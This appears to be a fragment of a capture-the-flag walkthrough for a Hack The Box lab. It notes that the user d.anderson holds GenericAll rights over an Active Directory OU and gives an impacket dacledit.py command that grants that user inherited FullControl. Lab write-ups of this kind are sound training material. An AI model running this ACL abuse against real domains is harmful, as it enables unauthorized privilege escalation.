The user D.ANDERSON@INFILTRATOR.HTB has GenericAll privileges to the OU MARKETING DIGITAL@INFILTRATOR.HTB.

This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

![[Pasted image 20240904201526.png]]

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' infiltrator.htb/d.anderson -k -no-pass -dc-ip 10.129.205.0 
```

